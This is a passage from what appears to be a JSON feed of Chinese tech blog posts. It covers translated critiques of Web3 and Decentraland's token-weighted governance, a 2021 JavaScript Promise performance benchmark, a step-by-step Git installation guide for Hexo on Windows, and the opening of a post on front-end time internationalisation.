否。通过对每一票收取幂等的货币 / 代币 / 金钱 / 等等(例如：1 票 = 1 美元，2 票 = 4 美元，3 票 = 8 美元，等等）。<strong>如果每个被投票的人都有一个固定的、一致的点数来分配给投票，那么这个方法就相当好，但如果把它与货币联系起来，你就会产生大量的问题。</strong></p>\n<p>举例说明，穷人只有更少的货币来表达他们的偏好。虽然一个穷人为了实现他们的诉求，愿意牺牲自己所有的一切，但是他们很容易就被一个有着相反偏好的富人所推翻。请看，非洲贫困国家缺乏公共交通、缺乏无障碍辅助设备、缺乏药物、缺乏纯净的饮用水和健康的食品供应。当地人并不是不需要这些东西，只是因为在富人们眼中，这些穷人的生活不值得被改善。 在美国，许多非白人的贫困社区因为「城市更新」政策被迫拆除、土地被用于修建高速公路，就是一个典型的例子。</p>\n<p>还有一个问题是，整个系统的模式是通过人为的稀缺性来获利。在 Decentraland 上的一票、一块土地、一件衣服或什么的，<strong>只是一系列的比特和字节，完全可以被自由复制或扩展</strong>。我特别厌恶 NFT 的主要原因是我对人工稀缺性的概念的厌恶，这种东西在 NFT 发明之前就已经困扰着数字世界，强硬的知识产权法充其量只是将大量的流行文化束缚在地下粉丝艺术家手中。我们的经济体系认为，自然和人类的创造物不是给世界的礼物，要负责任地和可持续地使用，而是作为资源被开发到其极限。自然，开发自然资源和荒谬的能源需求，仅仅是为了加强互联网上的物品的价值，这将是最终的结局，因为对我们来说，唯一重要的事情似乎是我们是否能从我们得到的礼物中产生投资回报。</p>\n<p>值得注意的是，我并非反对艺术家，出版社，版权委托书。我认为艺术印刷品在 Ko-Fi、Pateron 上付费是对创作伟大内容的回报，而不是一种贪婪地攫取金钱、希望从中获利的手段。<strong>NFT 正是因为无视艺术是情感的表达、是付诸了爱的劳动的概念，倾向于大规模生产垃圾赚快钱</strong>，才被我鄙视的。</p>\n<p>很明显，Decentraland 没有规定杜绝这种理念，除非硬分叉源代码，不做 Decentraland。如果  DAO 不能从平台上的交易费中获得足够的投资回报来继续运营，Decentraland 服务器本身也完全有可能倒闭。当然，<strong>所有的投票将主要由那些已经从 Decentraland 的方式中获益最多的人决定，他们对公平的竞争环境兴趣不大，而更愿意投票给那些给他们带来更多财富的东西，创造一个非常不平等和不公平的虚拟社会</strong>。</p>\n<p>我的最终结论是，Decentraland 是一个非常有趣的平台，<strong>但它有固有的等级制度，来自早期主要参与者积累的财富。</strong>从本质上讲，它和 Reddit 一样是一个单一的网站，拥有最多的代币的人就如 Reddit 的管理员和版主一样、凌驾于其他普通用户之上。如果 Decentraland 不使用区块链、将数据完全存储在 Decentraland 中心化的服务器上，或使用 Steam 钱包余额而不是 ERC-20 作为代币，以及通过纸质合同和法务部来执行公司内部的拨款，<strong>那么这个中心化的系统和现有的在区块链上运行的系统本质上仍然是完全相同的</strong>。如果 Decentraland 的服务器瘫痪，Decentraland 上的任何东西都没有价值；在它的生态之外，Decentraland 的任何东西也没有任何价值。简单地说，我不能真诚地称其拥有丝毫的去中心化。</p>\n<div class=\"license\">\n<div>[译] 不，Web3 不是去中心化</div>\n<div><a href=\"https://blog.skk.moe/post/web3-is-not-decentralization/\">https://blog.skk.moe/post/web3-is-not-decentralization/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2021-12-14</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/web3-is-not-decentralization/"},{"title":"[译] 捍卫自由的互联网，对 Web3 说不","date":"2021-12-12 13:40:00","description":"\n<h2>来自译者的楔子</h2>\n<p>作为一个充满泡沫和噱头的新概念，Web3 和元宇宙在区块链的社区中掀起了一波浪潮。鼓吹者坚信 Web3 就是互联网的未来、不惜砸下大把的金钱和精力、希望能在未来中捞一杯羹；而大部分人保持观望的态度。是时候来一点 Web3 的反对意见了。</p>\n<p>这篇译文将会作为我驳斥 Web3 的引子。在新的一年里，我会继续撰写评论文章、翻译来自区块链社区的观点，揭露 Web3 的谎言、戳破元宇宙的泡沫。</p>\n<blockquote><p>原文标题：Keep the web <strong>free</strong>, say <strong>no</strong> to <strong>Web3</strong><br>原文链接：<a href=\"https://yesterweb.org/no-to-web3/index.html\">https://yesterweb.org/no-to-web3/index.html</a><br>原文作者：<a href=\"https://yesterweb.org/\">Yesterday Web</a><br>译者：<a href=\"https://skk.moe/\">Sukka</a></p></blockquote>\n<p>Web3 被支持者称为一个想法、一个运动、新一代的互联网。</p>\n<p>Web3 被视为互联网的「未来」。这个概念由 <a href=\"https://www.sfchronicle.com/tech/article/Crypto-has-a-bro-problem-Women-in-the-field-say-16336453.php\">一群加密货币狂热者</a> 提出，基于现有的公共区块链。</p>\n<h2>Web3 声称其由社区管理</h2>\n<blockquote><p>虽然一个穷人为了实现他们的诉求，愿意牺牲自己所有的一切，但是他们很容易就被一个有着相反偏好的富人所推翻。请看，非洲贫困国家缺乏公共交通、缺乏无障碍辅助设备、缺乏药物、缺乏纯净的饮用水和健康的食品供应。当地人并不是不需要这些东西，只是因为在富人们眼中，这些穷人的生活不值得被改善。</p></blockquote>\n<p>许多 Web3 社区和加密货币有关社区都使用「<a href=\"https://en.wikipedia.org/wiki/Quadratic_voting\">平方投票法</a>」，即允许参与者表达他们对一个观点的偏好程度、而不是简单的「赞成」与「反对」。但是不幸的是，「你喜欢这个吗？」已经变成了「用你的钱告诉我，你有多喜欢这个」。换句话说，在决定 Web3 走向的道路中，参与者可以通过撒币来表达他们的诉求。</p>\n<p>InvisibleUp 的文章「<a href=\"https://invisibleup.com/articles/38/\">不，Web3 不是去中心化</a>」详细而有力地阐述了这个观点。</p>\n<h2>Web3 声称其是去中心化的</h2>\n<p>去中心化肯定是好事，但是加密货币和区块链绝对不是去中心化的唯一实现。请见 Soatok 发表在 Dhole Moments 上的文章「<a href=\"https://soatok.blog/2021/10/19/against-web3-and-faux-decentralization/\">Against Web3 and Faux-Decentralization</a>」。</p>\n<p>非常凑巧的是，Web3 的许多关键的「去中心化」基础设施都运行在由互联网巨头亚马逊提供的 中心化云计算服务 AWS 上（参见来自英国伍尔弗汉普顿大学的经济学家、数字货币投资者 Shaurya Malwa 发表的文章 「<a href=\"https://decrypt.co/44321/70-of-ethereum-nodes-are-hosted-on-centralized-services\">70% of Ethereum Nodes Are Hosted on Centralized Services</a>」），并且由「内幕人士」而非广大社区负责运营（参见区块链研究者、数字货币投资者 David Canellis 于 2019 年就以太坊硬分叉发表的评论文章「<a href=\"https://thenextweb.com/news/ethereum-insiders-fire-back-nodes\">Ethereum insiders deny there’s only one computer keeping a copy of its blockchain</a>」）。</p>\n<h2>Web3 声称要消除互联网的「中间人」</h2>\n<blockquote><p>想象一下，在 Web3 的倡议和提案中，用户将会真正拥有他们的数据。哇！那为什么像 Twitter 和 Facebook 的互联网巨头会允许有人破局呢？他们正在嫌赚的钱不够多呢！<br>—— Auzzie Jay。</p></blockquote>\n<p>Web3 的支持者缄口不谈他们将会如何消除被称为「中间人，Man in the Middle」的互联网巨头。不过，你如果想一下的话，他们刚刚好铲除了一个互联网巨头——Facebook，毕竟他们已经改名「元（Meta）」了，嗯。</p>\n<h2>Web3 声称要彻底杜绝数据泄露</h2>\n<p>不知道命运是否充满了讽刺，以太坊自己就因为数据泄露而损失了 5500 万美元（参见美国彭博社记者 Matthew Leising 出版的书籍「Out of the Ether: The Amazing Story of Ethereum and the $55 Million Heist That Almost Destroyed It All」、<a href=\"https://www.coindesk.com/tech/2020/09/17/the-55m-hack-that-almost-brought-ethereum-down/\">详细介绍了以太坊的历史、以及以太坊损失 5500 万美元的前后故事</a>）。</p>\n<p>Insider Inc. 签约作者 Carla Mozée 在四个月前（译者注：即 2021 年 8 月 31 日）发表了一篇文章「<a href=\"https://markets.businessinsider.com/news/currencies/cryptocurrency-hacks-fraud-cases-record-bitcoin-ethereum-wallets-breaches-defi-2021-8\">Cryptocurrency hacks and fraud are on track for a record number of incidents in 2021, data shows</a>」，详细介绍了过去八个月里发生的有关加密货币的非法集资、诈骗、黑客攻击事件、以及造成的损失。</p>\n<h2>Web3 声称要解决「双重开支」问题</h2>\n<blockquote><p>译者注：你可以把「双重开支」想象为开出的支票被复制，导致同一笔消费让你的账户被反复扣款。加密货币的 51% 攻击就是一个典型的「双重开支」问题。</p></blockquote>\n<p>加密货币并不能阻止「双重开支」问题，以至于社区为此发明了一个名词「51% 攻击」。当一个实体获得了整个区块链网络中超过 51% 的控制权，就能通过「最长链原则」控制这个区块链网络的走向、从而伪造交易。这种攻击是如此的普遍，以至于每年至少要发生一次，如 <a href=\"https://news.bitcoin.com/privacy-coin-verge-third-51-attack-200-days-xvg-transactions-erased/\">2018 年 Verge 遭遇三次 51% 攻击</a>、<a href=\"https://thehackernews.com/2019/01/ethereum-double-spend-attack.html\">2019 年以太坊经典遭遇双重开支攻击，损失达 110 万美元</a> 和 2020 年 <a href=\"https://cointelegraph.com/news/bitcoin-gold-blockchain-hit-by-51-attack-leading-to-70k-double-spend\">比特黄金遭遇 51% 攻击，导致了 7 万美元的双重开支</a>。</p>\n<p>所有区块链应用（不仅仅是加密货币）在设计时，都需要预防一个实体、或多个实体的组合控制超过一半的网络，但是 Web3 显然没有考虑到这一点。</p>\n<h2>Web3 从人为制造的稀缺性中获利</h2>\n<blockquote><p>为了获得最大的利润，生产者会限制生产、而不是确保对资源的最大化利用。</p></blockquote>\n<p>由于 Web3 和数字货币密切相关，因此不可避免地继承了数字货币「通过人为制造的稀缺性中获利」的本质。尽管「通过技术、生产或分享，理论上可以创造出无限丰富的数字化实体」，但是它们依然是稀缺的、控制在少数人手中。</p>\n<p>「人为制造的稀缺」是一个经典的经济学概念，你可以在 <a href=\"https://en.wikipedia.org/wiki/Artificial_scarcity\">Wikipedia 上读到浅显易懂的介绍</a>。</p>\n<h2>Web3 满足的是大鳄和投机者，而非整个互联网</h2>\n<p>React Native 应用开发者、Serverless 和 JAMstack 领域的专家、前 AWS 技术带头人 Nader Dabit 曾经在他的文章 <a href=\"https://www.freecodecamp.org/news/what-is-web3/\">What is Web3? The Decentralized Internet of the Future Explained</a> 中介绍了「与 Facebook 等互联网巨头不同」的公司会如何构建 Web3：</p>\n<ul>\n<li>宣发一个新的、令人激动的项目</li>\n<li>任何人都可以从第一天开始参与建设，或天使投资</li>\n<li>公司发布一些代币、10% 用于奖励早期建设者、10% 卖给天使投资人，剩下的留作未来开支的预算</li>\n<li>投资者和建设者 <strong>需要用代币来为项目的未来投票</strong>\n</li>\n<li><strong>谁拥有的代币越多，谁就有话语权</strong></li>\n</ul>\n<hr>\n<p>记住，任何推动 Web3 或是加密货币的人都是那些能从中获得真实利润的人，他们对互联网的未来毫不关心：</p>\n<ul>\n<li><a href=\"https://www.coindesk.com/tech/2021/08/26/microsoft-is-awarded-us-patent-for-crypto-token-creation-service/\">微软成功获得加密代币创建服务（Crypto Token Creation as a Service）的专利</a></li>\n<li><a href=\"https://thenextweb.com/news/nike-blockchain-sneakers-cryptokick-patent\">耐克现在拥有将区块链用于运动鞋的专利：CryptoKicks</a></li>\n<li><a href=\"https://adage.com/article/marketing-news-strategy/mcdonalds-gets-inito-nft-game-mcrib/2376996\">麦当劳发行 MCNFT 纪念 Mcrib 的回归</a></li>\n<li><a href=\"https://www.scmp.com/lifestyle/k-pop/article/3155551/nfts-and-cryptocurrency-draw-k-pop-labels-behind-bts-blackpink\">BTS、Blackpink、Twice 和其他团体背后的 K-Pop 寻求用 NFT 和加密货币来说服粉丝消费</a></li>\n<li><a href=\"https://cointelegraph.com/news/reddit-to-reportedly-tokenize-karma-points-and-onboard-500m-new-users\">Reddit 将其 5 亿用户的 Karma 转换为 ERC-20 代币</a></li>\n</ul>\n<p>Web3 只会进一步加剧贫富差距、加剧社会分层、加剧阶级隔阂。</p>\n<div class=\"license\">\n<div>[译] 捍卫自由的互联网，对 Web3 说不</div>\n<div><a href=\"https://blog.skk.moe/post/keep-web-free-say-no-to-web3/\">https://blog.skk.moe/post/keep-web-free-say-no-to-web3/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2021-12-12</div>\n</div>\n<div>              <div>更新于</div>\n<div>2021-12-13</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/keep-web-free-say-no-to-web3/"},{"title":"2021 年 JavaScript Promise 性能对比","date":"2021-12-07 08:19:00","description":"\n<p>我们正生活在一个「Any application that can be written in JavaScript, will eventually be written in JavaScript」的时代。作为一门兼具动态性和简单性的语言，JavaScript 已经占领了客户端、服务端，甚至在机器学习中也占据一席之地；不可避免的，异步执行也逐渐成为这门语言不可缺少的一部分。</p>\n<h2>TL; DR</h2>\n<ul>\n<li>Bluebird 依然是速度最快、内存占用最少的 Promise 实现</li>\n<li>Runtime 的 async / await 实现越来越快、顺序执行的性能已经超过 Native Promise，占用的内存也更少</li>\n<li>对于平行并发执行的 Promise，Bluebird 的性能依然一骑绝尘。编写运行在 Node.js 上的服务端程序仍然需要评估是否有必要引入 Bluebird</li>\n<li>所有对 Async / Await 的转译都不可避免的引入性能损耗；TypeScript Compiler（tsc）转译时引入的性能开销尤为明显，一般比原生 Async / Await 要慢至少两倍，同时要消耗更多的内存。</li>\n</ul>\n<h2>背景知识</h2>\n<h3>Node.js / v8 的 Promise 实现</h3>\n<p>关于 Bluebird vs Native，相信大部分读者肯定有一个问题：Bluebird 作为 Promise 的一个 JavaScript 实现，竟然会比 V8（Node.js 是基于 Chrome 的 V8 JavaScript 引擎的 Runtime）的 Native Promise 实现还快？</p>\n<p>实际上在 2017 年之前，<a href=\"https://github.com/v8/v8/blob/5.7.141/src/js/promise.js\">V8 的 Promise 也是用 JavaScript 实现的</a>、且并不完美，例如 <a href=\"https://github.com/v8/v8/blob/5.3.54/src/js/promise.js#L116-L119\">在 Promise 初始化时就分配数组给 Promise Handler</a> 导致不必要的内存占用；<a href=\"https://github.com/v8/v8/commit/1d4fe00287eabfb64d6bba51d685b2e668f179af\">V8 直到 2016 年 5 月才对此进行了优化</a>（V8 5.3.55）。<a href=\"https://github.com/v8/v8/commit/52e2c154ff18ae0e7ca807a5ad539750297c31b3#diff-9794588c64c777658e9ceb960f46260d0c49484ceb41e13dd1cc65ae1f05bd13\">V8 到 2016 年 12 月开始使用 C++ 实现 Promise</a>（V8 5.7.142）、在 Node.js 8 中落地（Node.js 7 使用的是 V8 5.5，Node.js 8 使用的是 V8 5.8）。</p>\n<h3>衡量 Promise 性能的方式</h3>\n<p><a href=\"https://blog.spion.dev/\">Gorgi Kosev</a> 在 2013 年 8 月发布了「<a href=\"https://blog.spion.dev/posts/analysis-generators-and-other-async-patterns-node.html\">Analysis of generators and other async patterns in node</a>」，详细介绍了 Generator Function，并与当时常见的异步实现（如 <code>Q.js</code>）、回调地狱的解决方案（<code>flatten.js</code>）的性能和编写难度进行了比较。Gorgi Kosev 提供了一段基于 Doxbee 的业务伪代码、涉及「数据库连接」「数据库事务回滚」「文件上传」「查询执行」等典型的 CRUD 和阻塞操作。后来，Bluebird 的作者为这段伪代码补充了一个 mock context，「Doxbee Benchmark」便成为了衡量 JavaScript 异步实现的性能的标准方法。V8 团队的 Maya Lekova 在 <a href=\"https://github.com/tc39/ecma262/pull/1250\">修改 ECMAScript Spec</a> 时，也使用了 Doxbee Benchmark 的数据来阐述修改的必要性。</p>\n<blockquote><p>顺便一提，早期 Promise 实现的性能完全无法入眼、一直被 JavaScript 开发者诟病，直到 2013 年 12 月 Petka Antonov 发布了 Bluebird 的首个版本，JavaScript 社区对 Promise 的印象才大幅改观。</p></blockquote>\n<h3>Bluebird 为什么这么快？</h3>\n<p>Bluebird 发布时，比同类实现快了将近 100 倍、内存占用却不到同类的十分之一；数年过去了，JavaScript 引擎的 JIT 不断进化（例如 V8 用 Turbofan 代替了 CrankShift），Bluebird 的性能依然在众多实现中出类拔萃脱颖而出。2016 年 Bluebird 的作者 Petka Antonov 写过一篇文章「<a href=\"https://www.reaktor.com/blog/javascript-performance-fundamentals-make-bluebird-fast/\">Three JavaScript performance fundamentals that make Bluebird fast</a>」，分享了三个简单且行之有效的 JavaScript 性能优化技巧。</p>\n<h2>Benchmark</h2>\n<p>此次 Benchmark 基于 V8 团队衡量 Async 优化、修改 ES Spec 时使用的 <a href=\"https://github.com/v8/promise-performance-tests/\">v8/promise-performance-tests</a> Benchmark Suite，额外增加了内存 RSS 统计，你可以前往 <a href=\"https://github.com/sukkaw/promise-performance-tests\">查看 Fork 后修改的版本</a>。</p>\n<p>运行环境为：</p>\n<pre><code class=\"hljs plaintext\">OS: Darwin 21.1.0 x64CPU: Intel(R) Core(TM) i9-9880H CPU @ 2.30GHz x 16Memory: 32768 MiB</code></pre>\n<h3>Bluebird vs Native Promise vs Native Async / Await</h3>\n<h4>顺序执行</h4>\n<p>顺序执行的 Promise 的特点是后一个 Promise 会用到前一个 Promise resolve 的值、只能在前一个 Promise fullfil 后执行：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> user = <span class=\"hljs-keyword\">await</span> <span class=\"hljs-title function_\">fetch</span>(<span class=\"hljs-string\">'/api/users/1'</span>);<span class=\"hljs-keyword\">const</span> job = <span class=\"hljs-keyword\">await</span> <span class=\"hljs-title function_\">fetch</span>(<span class=\"hljs-string\">`/api/jobs/<span class=\"hljs-subst\">${user.jobId}</span>`</span>);<span class=\"hljs-keyword\">const</span> colleagues = <span class=\"hljs-keyword\">await</span> <span class=\"hljs-title function_\">fetch</span>(<span class=\"hljs-string\">`/api/users/job/<span class=\"hljs-subst\">${job.id}</span>`</span>);</code></pre>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.7/1.png\" alt=\"1\" width=\"3061\" height=\"1815\"></p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.7/2.png\" alt=\"2\" width=\"3066\" height=\"1815\"></p>\n<p><strong>从 Node.js 12 开始，async/await 异步顺序执行的速度最快、占用内存最少</strong>，和 Node.js 12 使用的 V8 版本包含 Fast Async 的 Patch 不无关系；同时，Bluebird 比 Native Promise 的速度要快，占用的内存也更少。</p>\n<h4>平行执行</h4>\n<p>平行执行的 Promise 特点是数个 Promise 之间不存在依赖关系；虽然 JavaScript 是单线程的，当一个 Promise（非阻塞地）从外部 Worker（如 Network、File I/O 等）等待响应数据时，Runtime 可以将下一个 Promise 塞入 Event Loop 中：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> userIds = [<span class=\"hljs-number\">21</span>, <span class=\"hljs-number\">42</span>, <span class=\"hljs-number\">84</span>, <span class=\"hljs-number\">168</span>];<span class=\"hljs-keyword\">const</span> users = <span class=\"hljs-keyword\">await</span> <span class=\"hljs-title class_\">Promise</span>.<span class=\"hljs-title function_\">all</span>(userIds.<span class=\"hljs-title function_\">map</span>(<span class=\"hljs-function\"><span class=\"hljs-params\">id</span> =&gt;</span> <span class=\"hljs-title function_\">fetch</span>(<span class=\"hljs-string\">`/api/users/<span class=\"hljs-subst\">${id}</span>`</span>)));</code></pre>\n<p>平行执行的 Promise 的特点是使用 <code>Promise.all</code> 或 <code>Promise.allSettled</code>；Bluebird 除 <code>Bluebird.all</code> 以外，还有 <code>Bluebird.map</code> 和 <code>Bluebird.join</code> 可被用于平行执行。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.7/3.png\" alt=\"3\" width=\"3066\" height=\"1815\"></p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.9/4.png\" alt=\"4\" width=\"3052\" height=\"1782\"></p>\n<p>Bluebird 在平行执行时的性能一骑绝尘，比 Native 实现速度快 2~3 倍、内存占用却微不足道。</p>\n<h3>Native Promise vs JavaScript Promise</h3>\n<p>截至本文写就，绝大部分浏览器均已支持 Promise。但是如果要为古董浏览器如 IE 提供 Promise 支持，则依然需要使用 JavaScript 实现的 Polyfill。</p>\n<p>参与 Benchmark 的 Promise 实现有：</p>\n<ul>\n<li><a href=\"http://bluebirdjs.com/\">Bluebird</a></li>\n<li>\n<a href=\"https://github.com/zloirock/core-js\">core-js</a>（Babel、swc 都依赖的 polyfill 集合）</li>\n<li><a href=\"https://www.npmjs.com/package/es6-promise\">es6-promise@npm</a></li>\n<li><a href=\"https://www.npmjs.com/package/es6-promise-polyfill\">es6-promise-polyfill@npm</a></li>\n<li><a href=\"https://www.npmjs.com/package/promise\">promise@npm</a></li>\n<li><a href=\"https://www.npmjs.com/package/promise-polyfill\">promise-polyfill@npm</a></li>\n<li>\n<a href=\"https://www.npmjs.com/package/q\">Q.js</a>（支持 <code>new Q.Promise</code> 和 <code>Q.Promise</code> 两种使用方式，测试时调用不使用 <code>new</code>）</li>\n<li>\n<a href=\"https://www.npmjs.com/package/spromisemespeed\">SPromiseMeSpeed</a> （自称是最快的 Promise 实现、比 Bluebird 还快 2~548 倍）</li>\n<li><a href=\"https://www.npmjs.com/package/zousan\">Zousan</a></li>\n</ul>\n<h4>顺序执行</h4>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.8/5.png\" alt=\"5\" width=\"2905\" height=\"1824\"></p>\n<p>不出意外，Bluebird 顺序执行的性能比 Native 还要优秀，内存占用更是不到 Native 的 1/3；<code>core-js</code>、<code>SPromiseMeSpeed</code>、<code>promise@npm</code> 和 <code>es6-promise-polyfill@npm</code> 的性能与内存占用和 Native 实现接近。</p>\n<h4>平行执行</h4>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.7/6.png\" alt=\"6\" width=\"2905\" height=\"1828\"></p>\n<p>Bluebird 在平行执行上的表现依然一骑绝尘，<code>promise@npm</code> 也取得了类似的不凡成绩；而 <code>core-js</code> 等提供 Polyfill 则显得些许力不从心。</p>\n<h3>Async / Await</h3>\n<p>截止到本文写就，不支持 Async Function 的浏览器也已经屈指可数。如果要向下兼容仅支持 ES2016 甚至 ES5 的浏览器的话，依然需要通过转译的方式来模拟 Async Function 的行为。</p>\n<p>参与 Benchmark 的转译器有：</p>\n<ul>\n<li>\n<a href=\"https://babeljs.io/\">Babel</a> 默认使用的 <a href=\"https://www.npmjs.com/package/regenerator-runtime\"><code>regenerator-runtime</code></a>\n</li>\n<li>Babel 的一个非官方插件 <a href=\"https://www.npmjs.com/package/fast-async\">fast-async</a>\n</li>\n<li>Babel 的另一个非官方插件 <a href=\"https://www.npmjs.com/package/babel-plugin-transform-async-to-promises\">babel-plugin-transform-async-to-promises</a>\n</li>\n<li>\n<a href=\"https://www.typescriptlang.org/docs/handbook/2/basic-types.html#tsc-the-typescript-compiler\">tsc</a>，TypeScript 的官方 Compiler</li>\n</ul>\n<p>Benchmark 包括顺序执行（doxbee）、平行执行（parallel）和一个由 v8 提供的 Fibonacci 的计算测试：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">async</span> <span class=\"hljs-keyword\">function</span>* <span class=\"hljs-title function_\">fibonacciSequence</span>(<span class=\"hljs-params\"></span>) {  <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> a = <span class=\"hljs-number\">0</span>, b = <span class=\"hljs-number\">1</span>; ;) {    <span class=\"hljs-keyword\">yield</span> a;    <span class=\"hljs-keyword\">const</span> c = a + b;    a = b;    b = c;  }}<span class=\"hljs-keyword\">async</span> <span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">fibonacci</span>(<span class=\"hljs-params\">id, n</span>) {  <span class=\"hljs-keyword\">for</span> <span class=\"hljs-keyword\">await</span> (<span class=\"hljs-keyword\">const</span> value <span class=\"hljs-keyword\">of</span> <span class=\"hljs-title function_\">fibonacciSequence</span>()) {    <span class=\"hljs-keyword\">if</span> (n-- === <span class=\"hljs-number\">0</span>) <span class=\"hljs-keyword\">return</span> value;  }};</code></pre>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.7/7.png\" alt=\"7\" width=\"3396\" height=\"2067\"></p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.7/8.png\" alt=\"8\" width=\"3391\" height=\"2071\"></p>\n<div class=\"license\">\n<div>2021 年 JavaScript Promise 性能对比</div>\n<div><a href=\"https://blog.skk.moe/post/promise-performance-benchmark/\">https://blog.skk.moe/post/promise-performance-benchmark/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2021-12-07</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/promise-performance-benchmark/"},{"title":"在 Windows 上快速安装 Hexo · 安装 Git","date":"2021-11-12 13:30:00","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h2>\n<p><strong>本文未经允许，禁止转载！</strong></p>\n<p><strong>视频教程正在制作，等待更新。</strong></p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%96%87%E7%AB%A0%E7%9B%AE%E5%BD%95\" class=\"headerlink\" title=\"文章目录\"></a>文章目录</h3>\n<ul><li><a href=\"https://blog.yfun.top/posts/hexo-blog/install-git\">安装 Git</a></li></ul>\n<blockquote><p>更多文章等待更新...</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%B8%8B%E8%BD%BD\" class=\"headerlink\" title=\"下载\"></a>下载</h2>\n<p>前往 Git 官网 (<a href=\"https://git-scm.com/\">https://git-scm.com</a>).</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112204849.png\"></p>\n<p>点击页面中的 <code>Download For Windows</code> 下载 Windows 版本。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211507.png\"></p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%AE%89%E8%A3%85\" class=\"headerlink\" title=\"安装\"></a>安装</h2>\n<p>双击运行安装文件。</p>\n<p>点击 <code>Next</code>，同意协议。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211528.png\"></p>\n<p>修改程序安装位置，点击 <code>Next</code>（直接装在 C 盘也不是不行）。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211604.png\"></p>\n<p>组件选项，可选桌面快捷键、右键菜单、LFS 支持、自动检查更新等。</p>\n<p>点击 <code>Next</code> 进入下一步。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211609.png\"></p>\n<p>开始菜单文件夹名，保持默认就可以，点击 <code>Next</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211613.png\"></p>\n<p>默认编辑器，保持 Vim 就可以，点击 <code>Next</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211616.png\"></p>\n<p>环境变量，选择第 2 个，点击 <code>Next</code>。</p>\n<blockquote><p>如果选择第 1 个，则只能在 Git Bash 中使用，可能会出现问题</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211619.png\"></p>\n<p>剩下的都可以保持默认，一路 Next，然后点击 <code>Install</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211622.png\"><br><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211624.png\"><br><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211627.png\"><br><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211630.png\"><br><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211633.png\"></p>\n<p>等待安装完毕。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%B5%8B%E8%AF%95\" class=\"headerlink\" title=\"测试\"></a>测试</h2>\n<p>在文件夹处右击，点击 <code>Git Bash Here</code> 进入 Git Bash。</p>\n<p>（或是在开始菜单中找到 Git Bash）</p>\n<p>输入 <code>git --version</code> 查看版本，正确输出版本信息即代表安装成功。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/7ec315b7764cc.png\"></p>\n<p>大功告成！</p>\n","link":"https://blog.yfun.top/posts/hexo-blog/install-git/"},{"title":"前端时间国际化 101","date":"2021-10-14 15:58:23","description":"\n<blockquote>\n<p>时间只是幻觉。</p>\n<footer>—— 阿尔伯特·爱因斯坦</footer>\n</blockquote>\n<p>最近在开发一个需要完善国际化方案的前端项目，在处理时间国际化的时候遇到了一些问题。于是花了一些时间研究，有了这篇文章。不过由于网上关于 JavaScript 中 <code>Date</code> 对象的坑的文章已经一抓一大把了，<strong>因此这篇文章不是 JavaScript 中 <code>Date</code> 